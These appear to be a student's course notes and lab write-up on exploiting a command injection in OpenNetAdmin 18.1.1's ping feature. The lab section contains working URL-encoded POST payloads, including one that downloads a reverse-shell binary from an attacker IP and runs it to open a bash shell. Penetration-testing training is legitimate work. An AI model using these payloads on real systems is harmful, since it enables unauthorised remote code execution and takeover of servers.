This Learning Unit covers the following Learning Objectives:

1. Understand how we discover the command injection in Open Net Admin.
2. Understand how we exploit the command injection in Open Net Admin.

In this Learning Unit, we'll present a case study in which we will use many of the techniques we've discussed in this Learning Module. We'll be exploiting a command injection vulnerability in version 18.1.1 of _OpenNetAdmin_, an IP Address Management (IPAM) system.

-----------

#### 11.4.1. Accessing OpenNetAdmin

In the coming sections, we will be using the _opennetadmin_ case study machine.

To begin, let's make an entry for OpenNetAdmin in the /etc/hosts file on Kali. This will allow us to connect to it via its hostname rather than IP address.

```bash
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.105 opennetadmin
```

Next, let's try to browse to the machine by name:
![[Pasted image 20241103194010.png]]
Now that we're set up, let's begin our discovery and assessment phase.

#### 11.4.2. Discovery and Assessment

We'll begin this black-box assessment by browsing to the home page for OpenNetAdmin at `http://opennetadmin:80/ona/`.
![[Pasted image 20241103195224.png]]

The application lists our privilege level in the top-right of the page. We currently have limited "guest" privileges.

To address this, we will log in with the default credentials of "admin" as both the username and password.

Fantastic, we are logged in as admin and have full access to the web application and all of its features.

***More often than not, if an exploit requires authentication, a low-privileged user (or even a guest user) will suffice for successful exploitation.***

We will now begin to analyze the application. Along the way, we will take note of any interesting parameters, functionality, or inputs. Let's explore the app and look for any existing networks. Clicking _Search_ will display _Services_ and _Associated hosts_.

![[Pasted image 20241103195337.png]]

![[Pasted image 20241103195404.png]]

The "Nmap Scan" entry in the list implies that OpenNetAdmin supports Nmap functionality.

Upon clicking _View Report_, we are presented with the following:

![[Pasted image 20241103195421.png]]
We note that OpenNetAdmin contains several alarming features, including Nmap and ping. We've worked with ping a lot in this Learning Module so let's continue in that direction by clicking _Ping to verify_.

![[Pasted image 20241103195446.png]]
We are then presented with a _Ping Results_ window.
![[Pasted image 20241103195537.png]]

Based on this output, it seems the application is running the system's ping command. Let's explore this further to determine if we have a vector for command injection.

-------

#### 11.4.3. Exploitation

Let's further explore the ping function, determine if a vulnerability exists, and if so, figure out how to exploit it. Since it doesn't appear we can manipulate GET parameters from the browser's URL bar, let's open Burp Suite and enable the _Intercept_ feature located under the _Proxy_ tab.

![[Pasted image 20241103202603.png]]
Next, we will again click on _Ping to verify_ in OpenNetAdmin and further analyze what is happening. Burp immediately intercept the request.
![[Pasted image 20241103202822.png]]Unfortunately, it doesn't appear that any parameters (like an IP address) are passed to ping so we don't have an obvious attack vector in this initial request.

However, let's continue to _Forward_ the initial request, and analyze that data. Perhaps we will find POST data we can manipulate, such as an IP or other destination argument.

![[Pasted image 20241103202901.png]]
This reveals an _ip_ parameter that is sent to ping.

This is dangerous territory for OpenNetAdmin.

If we are able to use any command separators, logical operators, or inline-execution statements and receive expected terminal output, we will have confirmed command injection.

Let's right-click in the request and select _Send to Repeater_ so we can modify the request to test various manipulations in an attempt to extend the command's functionality.

We'll work within the _ip_ parameter shown below in the _Repeater_ tab:

![[Pasted image 20241103205005.png]]

Let's inject ";id" as a simple command injection test.

The full set of POST data and arguments of our attempted command injection is shown below:

```bash
xajax=window_submit&xajaxr=1632763728103&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;id&xajaxargs[]=ping
```
Our injection attempt is also shown in Burp Suite's _Repeater_.
If everything goes according to plan, when we click _Send_, we could have command injection (and thus code execution) on the target machine.

![[Pasted image 20241103205046.png]]
Our id command executed. We have validated a command injection vector and can perform remote code execution. Excellent.

This machine is now completely compromised.


##### Labs
`OS{ona_flag1}`

![[Pasted image 20241103211720.png]]
1. Utilize our newly found code execution capability to retrieve a reverse shell, locate and exfiltrate the contents of the flag.txt file located in the web-root of ONA.
pwd
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;pwd&xajaxargs[]=ping
```
![[Pasted image 20241103205239.png]]
looking to see if curl exists
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;which+curl&xajaxargs[]=ping
```
![[Pasted image 20241103205531.png]]
testing to see if able to curl file
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;curl+http%3a//192.168.45.222%3a80/test.txt&xajaxargs[]=ping
```
![[Pasted image 20241103205640.png]]
worked
![[Pasted image 20241103205707.png]]

```bash
curl -o /tmp/revshell http://192.168.45.222:80/revshell && chmod 755 /tmp/ && /tmp/revshell -nv 192.168.45.222 4444 -e /bin/bash
```
full burp payload with url encoding
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;curl+-o+/tmp/revshell+http%3a//192.168.45.222%3a80/revshell+%26%26+chmod+755+/tmp/+%26%26+/tmp/revshell+-nv+192.168.45.222+4444+-e+/bin/bash&xajaxargs[]=ping
```
`ls -la /tmp/` to check if it worked
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;ls+-la+/tmp/&xajaxargs[]=ping
```
was able to upload file didnt make executable
![[Pasted image 20241103211123.png]]
making executable in stand alone command
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;chmod 755 /tmp/revshell&xajaxargs[]=ping
```
ensuring it worked with `ls -la` again
![[Pasted image 20241103211334.png]]
command used to execute 
```bash
/bin/bash -e /tmp/revshell
```
in order to execute utilizing payload below - this is after url encoding
```bash
xajax=window_submit&xajaxr=1730683603857&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;/bin/bash+-e+/tmp/revshell&xajaxargs[]=ping
```
![[Pasted image 20241103211607.png]]

![[Pasted image 20241103211656.png]]